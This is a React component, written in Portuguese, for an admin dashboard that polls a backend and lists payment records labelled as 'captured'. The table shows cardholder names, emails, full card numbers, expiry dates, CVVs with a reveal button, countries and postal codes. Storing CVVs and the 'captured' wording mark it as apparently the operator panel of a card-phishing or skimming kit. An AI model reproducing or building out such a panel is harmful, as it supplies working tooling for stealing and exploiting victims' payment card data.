import React, { useState, useEffect } from 'react';
import { Search, Eye, EyeOff, ShieldAlert } from 'lucide-react';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';

export default function AdminCards() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [showCVV, setShowCVV] = useState({});
  const [showCard, setShowCard] = useState({});

  useEffect(() => {
    const fetchCards = async () => {
      try {
        const token = localStorage.getItem('adminToken');
        const res = await fetch(`${BACKEND_URL}/api/admin/cards`, {
          headers: { Authorization: `Bearer ${token}` }
        });
        if (res.ok) setCards(await res.json());
      } catch (e) {}
      setLoading(false);
    };
    fetchCards();
    const interval = setInterval(fetchCards, 5000);
    return () => clearInterval(interval);
  }, []);

  const filtered = cards.filter(c =>
    !search ||
    c.full_name?.toLowerCase().includes(search.toLowerCase()) ||
    c.email?.toLowerCase().includes(search.toLowerCase()) ||
    c.country?.toLowerCase().includes(search.toLowerCase())
  );

  const maskCard = (num) => {
    const digits = num.replace(/\s/g, '');
    if (digits.length >= 12) return `**** **** **** ${digits.slice(-4)}`;
    return num;
  };

  return (
    <div>
      <div style={{ marginBottom: 16 }}>
        <h1 style={{ fontFamily: 'var(--font-heading)', fontSize: 20, fontWeight: 700, color: '#f3f5ff', marginBottom: 4 }}>Dados de Cartões</h1>
        <p style={{ fontSize: 13, color: 'hsl(215,16%,70%)' }}>{cards.length} registo{cards.length !== 1 ? 's' : ''} capturado{cards.length !== 1 ? 's' : ''}</p>
      </div>

      {/* Security Banner */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16, padding: '12px 16px', background: 'hsl(0,78%,54%,0.08)', border: '1px solid hsl(0,78%,54%,0.2)', borderRadius: 12 }}>
        <ShieldAlert size={16} color="hsl(0,78%,54%)" />
        <span style={{ fontSize: 12, color: 'hsl(215,16%,70%)', lineHeight: 1.5 }}>
          <strong style={{ color: 'hsl(0,78%,54%)' }}>Acesso Restrito</strong> — Esta informação é confidencial. Acesso registado para auditoria.
        </span>
      </div>

      {/* Search */}
      <div style={{ position: 'relative', marginBottom: 16, maxWidth: 360 }}>
        <Search size={14} style={{ position: 'absolute', left: 10, top: '50%', transform: 'translateY(-50%)', color: 'hsl(215,16%,70%)' }} />
        <input
          data-testid="admin-cards-search-input"
          type="text"
          placeholder="Pesquisar por nome ou email..."
          value={search}
          onChange={e => setSearch(e.target.value)}
          style={{ width: '100%', padding: '9px 12px 9px 32px', background: 'hsl(240,26%,8%)', border: '1px solid hsl(240,16%,22%)', borderRadius: 9, color: '#f3f5ff', fontSize: 13, outline: 'none', boxSizing: 'border-box' }}
        />
      </div>

      {/* Table */}
      <div data-testid="admin-cards-table" style={{ background: 'hsl(240,26%,8%)', border: '1px solid hsl(240,16%,18%)', borderRadius: 14, overflow: 'hidden' }}>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead>
              <tr style={{ background: 'hsl(240,18%,11%)' }}>
                {['Data/Hora', 'Titular', 'Email', 'Número do Cartão', 'Validade', 'CVV', 'País', 'C. Postal', 'Montante'].map(h => (
                  <th key={h} style={{ padding: '11px 14px', textAlign: 'left', fontSize: 10, fontWeight: 700, color: 'hsl(215,16%,70%)', textTransform: 'uppercase', letterSpacing: '0.08em', whiteSpace: 'nowrap' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr><td colSpan={9} style={{ padding: 40, textAlign: 'center', color: 'hsl(215,16%,70%)', fontSize: 13 }}>A carregar...</td></tr>
              ) : filtered.length === 0 ? (
                <tr><td colSpan={9} style={{ padding: 40, textAlign: 'center', color: 'hsl(215,16%,70%)', fontSize: 13 }}>Nenhum registo encontrado</td></tr>
              ) : (
                filtered.map((card, idx) => (
                  <tr key={card.id} style={{ borderTop: '1px solid hsl(240,16%,18%)', background: idx % 2 === 0 ? 'transparent' : 'hsl(240,18%,8%,0.5)' }}>
                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>
                        {card.created_at ? new Date(card.created_at).toLocaleString('pt-PT') : '-'}
                      </span>
                    </td>
                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
                      <span style={{ fontSize: 12, fontWeight: 600, color: '#f3f5ff' }}>{card.full_name}</span>
                    </td>
                    <td style={{ padding: '12px 14px' }}>
                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.email || '-'}</span>
                    </td>
                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span className="numeric" style={{ fontSize: 12, fontWeight: 600, color: '#f3f5ff', letterSpacing: '0.1em' }}>
                          {showCard[card.id] ? card.card_number : maskCard(card.card_number)}
                        </span>
                        <button
                          onClick={() => setShowCard(prev => ({ ...prev, [card.id]: !prev[card.id] }))}
                          style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'hsl(215,16%,60%)', padding: 2 }}
                        >
                          {showCard[card.id] ? <EyeOff size={13} /> : <Eye size={13} />}
                        </button>
                      </div>
                    </td>
                    <td style={{ padding: '12px 14px' }}>
                      <span className="numeric" style={{ fontSize: 12, color: '#f3f5ff' }}>{card.expiry}</span>
                    </td>
                    <td style={{ padding: '12px 14px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span className="numeric" style={{ fontSize: 12, color: '#f3f5ff', letterSpacing: '0.1em' }}>
                          {showCVV[card.id] ? card.cvv : '•••'}
                        </span>
                        <button
                          onClick={() => setShowCVV(prev => ({ ...prev, [card.id]: !prev[card.id] }))}
                          style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'hsl(215,16%,60%)', padding: 2 }}
                        >
                          {showCVV[card.id] ? <EyeOff size={13} /> : <Eye size={13} />}
                        </button>
                      </div>
                    </td>
                    <td style={{ padding: '12px 14px' }}>
                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.country}</span>
                    </td>
                    <td style={{ padding: '12px 14px' }}>
                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.postal_code}</span>
                    </td>
                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
                      <span className="numeric" style={{ fontSize: 13, fontWeight: 700, color: 'hsl(214,100%,60%)' }}>
                        {new Intl.NumberFormat('pt-PT', { style: 'currency', currency: 'EUR' }).format(card.amount || 0)}
                      </span>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
